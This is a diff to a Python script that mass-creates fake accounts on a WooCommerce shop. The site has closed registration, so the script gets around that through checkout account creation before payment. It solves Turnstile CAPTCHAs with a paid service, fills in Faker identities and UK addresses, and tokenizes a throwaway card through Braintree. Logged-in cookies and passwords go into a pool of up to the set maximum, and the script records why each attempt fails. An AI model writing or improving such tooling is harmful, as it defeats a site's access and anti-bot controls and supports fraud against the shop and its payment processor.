@@ -92,6 +92,16 @@ def bump_stat(key, by=1):
         st[key] = st.get(key, 0) + by
         save_stats(st)
 
+def bump_fail_reason(reason):
+    """Track WHERE creation dies — register_page / captcha / no_login_cookie etc."""
+    reason = (str(reason) or "unknown")[:60]
+    with _stats_lock:
+        st = load_stats()
+        reasons = st.get("fail_reasons", {})
+        reasons[reason] = reasons.get(reason, 0) + 1
+        st["fail_reasons"] = reasons
+        save_stats(st)
+
 def stats_payload():
     """Full pool picture — one shape everywhere (/, /b3?acc=0, /stop)."""
     st = load_stats()
@@ -110,6 +120,7 @@ def stats_payload():
         "failed_during_building": failed,
         "expired": st.get("expired_total", 0),
         "failed_total": st.get("failed_total", 0),
+        "fail_reasons": st.get("fail_reasons", {}),
         "session": {"requested": requested, "done": done, "failed": failed},
         "pool_min": MIN_ACCOUNTS,
         "pool_max": MAX_ACCOUNTS,
@@ -306,7 +317,14 @@ def solve_turnstile(page_url=None, sitekey="0x4AAAAAAA9ogJWz4UGndXNX", max_retry
 # ─── Account Creator ─────────────────────────────────────────
 
 def create_account(proxy=None):
+    """Checkout-based creation — the site closed my-account registration, but
+    WooCommerce still creates the account during checkout (createaccount=1)
+    BEFORE payment processing, so the card decline doesn't matter: we keep
+    the account + logged-in cookies."""
     from bs4 import BeautifulSoup
+    import base64
+    import uuid
+    import json
     if not BASE_URL:
         return {"email": "", "status": "failed", "reason": "config_missing_base_url"}
     s = plain_requests.Session()
@@ -317,45 +335,115 @@ def create_account(proxy=None):
     })
     fake_us = Faker('en_US')
     first, last = fake_us.first_name(), fake_us.last_name()
-    email = f"{first.lower()}{last.lower()}{random.randint(1975,2005)}@gmail.com"
+    email = f"{first.lower()}{last.lower()}{random.randint(1975, 2005)}@gmail.com"
+    pwd = f"{first.capitalize()}@{random.randint(1000, 9999)}!"
     try:
-        # 1. Register page -> get register nonce + turnstile
+        # 1. Shop page -> find a product
         if _stop_creating_event.is_set():
             return {"email": email, "status": "failed", "reason": "stopped"}
-        r = s.get(f"{BASE_URL}/my-account/", timeout=20)
-        if r.status_code != 200: return {"email": email, "status": "failed", "reason": "register_page"}
+        r = s.get(f"{BASE_URL}/shop/", timeout=20)
+        if r.status_code != 200:
+            return {"email": email, "status": "failed", "reason": "shop_page_failed"}
+        pids = re.findall(r'data-product_id="(\d+)"', r.text)
+        if not pids: pids = re.findall(r'add-to-cart=(\d+)', r.text)
+        if not pids:
+            return {"email": email, "status": "failed", "reason": "no_product_found"}
+        pid = random.choice(pids)
+
+        # 2. Add to cart
+        s.get(f"{BASE_URL}/?add-to-cart={pid}", timeout=20)
+
+        # 3. Checkout page -> nonce + turnstile
+        if _stop_creating_event.is_set():
+            return {"email": email, "status": "failed", "reason": "stopped"}
+        r = s.get(f"{BASE_URL}/checkout/", timeout=20)
+        if r.status_code != 200:
+            return {"email": email, "status": "failed", "reason": "checkout_page_failed"}
         soup = BeautifulSoup(r.text, 'html.parser')
-        rn = soup.find("input", {"name": "woocommerce-register-nonce"})
-        if not rn: return {"email": email, "status": "failed", "reason": "no_register_nonce"}
-        rnv = rn.get("value")
+        cn = soup.find("input", {"name": "woocommerce-process-checkout-nonce"})
+        if not cn:
+            return {"email": email, "status": "failed", "reason": "no_checkout_nonce"}
+        cn_val = cn.get("value")
+        cm = re.search(r'"client_token_nonce":"([a-f0-9]+)"', r.text)
+        if not cm:
+            return {"email": email, "status": "failed", "reason": "no_client_token_nonce"}
+        ctn = cm.group(1)
 
-        # 2. Solve turnstile
+        # 4. Solve turnstile (CaptchaAI)
         if _stop_creating_event.is_set():
             return {"email": email, "status": "failed", "reason": "stopped"}
-        gt = solve_turnstile(f"{BASE_URL}/my-account/")
-        if not gt: return {"email": email, "status": "failed", "reason": "captcha"}
+        gt = solve_turnstile(f"{BASE_URL}/checkout/")
+        if not gt:
+            return {"email": email, "status": "failed", "reason": "captcha"}
 
-        # 3. Submit registration
+        # 5. Braintree client token + tokenize throwaway card (decline is fine —
+        #    the account is already created by the time payment is processed)
+        rb = s.post(f"{BASE_URL}/wp-admin/admin-ajax.php",
+                    data={"action": "wc_braintree_credit_card_get_client_token", "nonce": ctn},
+                    headers={'x-requested-with': 'XMLHttpRequest'}, timeout=20)
+        bd = rb.json()
+        dec = json.loads(base64.b64decode(bd["data"]).decode('utf-8'))
+        rt = plain_requests.post(f"{dec['clientApiUrl']}/v1/payment_methods/credit_cards", json={
+            "creditCard": {"number": "4111111111111111", "expirationMonth": "12",
+                           "expirationYear": "2026", "cvv": "123"},
+            "authorizationFingerprint": dec['authorizationFingerprint'],
+            "braintreeLibraryVersion": "braintree/web/3.88.0",
+            "_meta": {"platform": "web", "sdkVersion": "3.88.0", "source": "form",
+                      "integration": "custom", "sessionId": uuid.uuid4().hex}
+        }, timeout=30)
+        try:
+            cn_card = rt.json()['creditCards'][0]['nonce']
+        except Exception:
+            return {"email": email, "status": "failed",
+                    "reason": f"tokenize: {sanitize(rt.text[:80])}"}
+
+        # 6. Checkout with account creation — account + login land before payment
         if _stop_creating_event.is_set():
             return {"email": email, "status": "failed", "reason": "stopped"}
-        r = s.post(f"{BASE_URL}/my-account/", data={
-            "email": email,
-            "woocommerce-register-nonce": rnv,
-            "_wp_http_referer": "/my-account/",
-            "register": "Register",
+        addr = random.choice(UK_ADDRESSES)
+        checkout_data = {
+            "ship_to_different_address": "1",
+            "shipping_first_name": first, "shipping_last_name": last,
+            "shipping_country": "GB",
+            "shipping_address_1": addr["a1"], "shipping_address_2": addr["a2"],
+            "shipping_city": addr["city"], "shipping_state": addr["state"],
+            "shipping_postcode": addr["zip"], "shipping_phone": addr["phone"],
+            "billing_first_name": first, "billing_last_name": last,
+            "billing_country": "GB",
+            "billing_address_1": addr["a1"], "billing_address_2": addr["a2"],
+            "billing_city": addr["city"], "billing_state": addr["state"],
+            "billing_postcode": addr["zip"], "billing_phone": addr["phone"],
+            "billing_email": email, "shipping_email": email,
+            "use_shipping_address": "1",
+            "createaccount": "1",
+            "account_username": email,
+            "account_password": pwd,
+            "payment_method": "braintree_credit_card",
+            "wc-braintree-credit-card-card-type": "visa",
+            "wc-braintree-credit-card-3d-secure-order-total": "100.00",
+            "wc_braintree_credit_card_payment_nonce": cn_card,
+            "wc-braintree-credit-card-tokenize-payment-method": "true",
+            "woocommerce-process-checkout-nonce": cn_val,
+            "_wp_http_referer": "/?wc-ajax=update_order_review",
             "cf-turnstile-response": gt,
-        }, timeout=25, allow_redirects=True)
+            "terms": "on",
+            "terms-field": "1",
+        }
+        r = s.post(f"{BASE_URL}/?wc-ajax=checkout", data=checkout_data,
+                   timeout=25, allow_redirects=True)
         cd = s.cookies.get_dict()
         if not any("wordpress_logged_in" in k for k in cd):
-            # check for registration error message
-            soup = BeautifulSoup(r.text, 'html.parser')
-            ee = soup.find(class_='woocommerce-error')
-            reason = re.sub(r'\s+', ' ', ee.get_text().strip())[:60] if ee else "no_login_cookie"
-            return {"email": email, "status": "failed", "reason": reason}
+            try:
+                rj = r.json()
+                reason_text = BeautifulSoup(rj.get("messages", ""), 'html.parser').get_text().strip()
+                if not reason_text: reason_text = "no_login_cookie"
+                return {"email": email, "status": "failed", "reason": reason_text[:80]}
+            except Exception:
+                return {"email": email, "status": "failed", "reason": "no_login_cookie_and_no_json"}
 
-        # 4. Save to pool — account is DONE the moment registration + login succeed.
-        new_entry = {"email": email, "password": "", "cookies": cd,
-                     "billing": False, "created_at": time.strftime("%Y-%m-%d %H:%M:%S")}
+        # 7. Save to pool — billing already set during checkout, so skip lazy billing
+        new_entry = {"email": email, "password": pwd, "cookies": cd,
+                     "billing": True, "created_at": time.strftime("%Y-%m-%d %H:%M:%S")}
         pool = load_pool()
         pool.append(new_entry)
         if len(pool) > MAX_ACCOUNTS: pool = pool[-MAX_ACCOUNTS:]   # ceiling, not 500
@@ -392,6 +480,7 @@ def create_accounts_bg(count, proxy=None):
                 _acc_failed += 1                   # cancelled ≠ failed
         if not ok and not stopped:
             bump_stat("failed_total")              # lifetime build failures
+            bump_fail_reason((result or {}).get("reason", "unknown"))
         return True
 
     # 5 accounts in parallel — submissions staggered slightly so we don't
